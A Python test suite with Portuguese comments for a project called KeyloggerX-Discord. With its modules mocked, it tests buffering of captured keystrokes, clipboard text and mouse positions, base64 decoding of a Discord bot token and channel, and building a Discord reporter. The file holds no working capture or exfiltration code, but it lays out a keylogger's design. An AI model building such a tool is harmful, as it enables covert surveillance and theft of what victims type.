"""Testes do KeyloggerX-Discord (módulos pesados mockados)."""
import base64
import json
import os
import sys
import tempfile
import types
from unittest.mock import MagicMock

# Mock de dependências nativas de GUI/teclado/Discord (não instaladas no CI)
for name in ("keyboard", "pyautogui", "pyperclip", "discord", "pynput",
             "pynput.keyboard"):
    mod = types.ModuleType(name)
    mod.__dict__.update({
        "Client": MagicMock,
        "Intents": MagicMock(static=MagicMock(default=MagicMock(return_value=MagicMock()))),
        "hook": MagicMock(),
        "listen": MagicMock(),
        "on_press": MagicMock(),
        "on_release": MagicMock(),
        "Controller": MagicMock,
        "Key": MagicMock(),
        "Button": MagicMock(),
        "copy": MagicMock(),
        "paste": MagicMock(text=""),
    })
    sys.modules[name] = mod
# discord precisa de atributos usados no import
sys.modules["discord"].Intents = MagicMock()
sys.modules["discord"].Client = MagicMock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.buffer_manager import BufferManager
from src.main import load_config


def test_buffer_session_flow():
    b = BufferManager()
    b.current_session.extend(["a", "b", "c"])
    b.flush_session("12:00:00")
    assert b.keystrokes == [{"time": "12:00:00", "keys": ["a", "b", "c"]}]
    assert b.current_session == []
    b.clipboard.append("segredo")
    snap = b.snapshot()
    assert snap["keystrokes"] and snap["clipboard"] == ["segredo"]
    # snapshot é cópia — alterar não afeta o buffer
    snap["clipboard"].append("x")
    assert b.clipboard == ["segredo"]
    b.clear_all()
    assert b.snapshot() == {"keystrokes": [], "clipboard": [], "mouse_positions": []}


def test_buffer_thread_safety():
    import threading
    b = BufferManager()
    def worker():
        for i in range(200):
            with b.lock:
                b.current_session.append(i)
    threads = [threading.Thread(target=worker) for _ in range(4)]
    for t in threads: t.start()
    for t in threads: t.join()
    assert len(b.current_session) == 800


def test_load_config_roundtrip():
    payload = "MEU_TOKEN_SECRETO@987654321"
    data = base64.b64encode(payload.encode()).decode()
    with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False,
                                     encoding="utf-8") as f:
        json.dump({"data": data}, f)
        path = f.name
    token, channel = load_config(path)
    assert token == "MEU_TOKEN_SECRETO"
    assert channel == 987654321
    os.unlink(path)


def test_load_config_missing_file():
    try:
        load_config("/nao/existe.json")
        raise AssertionError("deveria falhar")
    except FileNotFoundError:
        pass


def test_example_config_is_valid_json():
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    ex = os.path.join(here, "config", "credentials.json.example")
    cfg = json.load(open(ex, encoding="utf-8"))
    assert "data" in cfg


def test_reporter_constructs_with_mock_discord():
    from src.reporter import Reporter
    b = BufferManager()
    r = Reporter("tok", 123, b)
    assert r.channel_id == 123
    assert r.client is not None


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in fns:
        fn()
        print(f"✅ {fn.__name__}")
    print(f"\n{len(fns)} testes passaram.")
